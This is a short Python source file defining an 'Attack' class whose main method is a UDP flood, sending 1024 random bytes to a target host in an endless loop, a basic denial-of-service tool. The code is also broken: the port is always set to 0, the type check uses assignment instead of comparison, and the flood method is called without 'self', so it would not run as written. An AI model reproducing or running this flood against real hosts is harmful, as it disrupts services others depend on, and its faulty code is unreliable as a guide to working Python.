from target import Target
import socket, random

class Attack():
    def __init__(self, type, host, port=0):
        self.host = host
        self.port = 0
        self.type = type
        self.target = Target(host, port)

    def checkTargetAlive(self):
        print(self.target.isAlive())

    def udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024)
        sent = 0
        while 1:
            sock.sendto(bytes, (self.host, self.port))


    def attack(self):
        if self.type = 'udpflood':
            udp_flood()


    
    

        